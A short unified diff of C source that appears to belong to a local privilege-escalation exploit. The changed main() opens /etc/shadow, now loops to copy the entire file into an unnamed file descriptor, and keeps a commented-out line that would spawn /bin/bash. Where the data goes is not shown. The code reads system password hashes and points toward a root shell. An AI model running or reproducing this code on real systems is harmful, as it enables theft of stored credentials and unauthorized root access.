@@ -52,8 +52,13 @@ int main() {
 
   int shadow = open("/etc/shadow", O_RDWR);
 	char buf[65000];
-	int n = read(shadow, buf, sizeof(buf));
-	write(fd, buf, n);
+	for(;;) {
+		int n = read(shadow, buf, sizeof(buf));
+		if(n <= 0) {
+			break;
+		}
+		write(fd, buf, n);
+	}
 //  execl("/bin/bash", "/bin/bash", NULL);
 
 }
